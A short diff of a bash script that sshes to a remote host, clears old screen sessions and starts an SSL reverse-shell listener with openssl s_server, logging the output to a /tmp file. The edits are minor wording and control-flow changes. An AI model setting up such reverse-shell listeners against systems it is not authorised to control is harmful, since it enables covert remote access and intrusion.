@@ -23,9 +23,10 @@ else
 fi
 
 #Make sure there are no previous sessions running!
-echo -e "${BYELLOW}Making sure there are no previous sessions active...${NOCOLOR}"
-ssh -t -p $sshport -l $sshuser $rhost "screen -ls | grep listener_$cname | cut -d '.' -f 1 | xargs kill -9 2>/dev/null && screen -wipe"
+echo -e "${BYELLOW}Making sure there are no previous sessions active sessions...${NOCOLOR}"
+ssh -t -p $sshport -l $sshuser $rhost "screen -ls | grep listener_$cname | cut -d '.' -f 1 | xargs kill -9 2>/dev/null ; screen -wipe"
 
+echo -e "${BYELLOW}Starting listener on receiving host...${NOCOLOR}"
 #Start the listener (with ssl) on our remote(receiver) host via ssh and log everything to a temp file for external probing
 ssh -t -p $sshport -l $sshuser $rhost "rm -f /tmp/reverselistener_$cname; screen -dmS listener_$cname; screen -S listener_$cname -X stuff \"openssl s_server -quiet -key ~/.ReverseShell/$cname/key.pem -cert ~/.ReverseShell/$cname/cert.pem -port $rport | tee /tmp/reverselistener_$cname\"`echo -ne '\015'`"
 
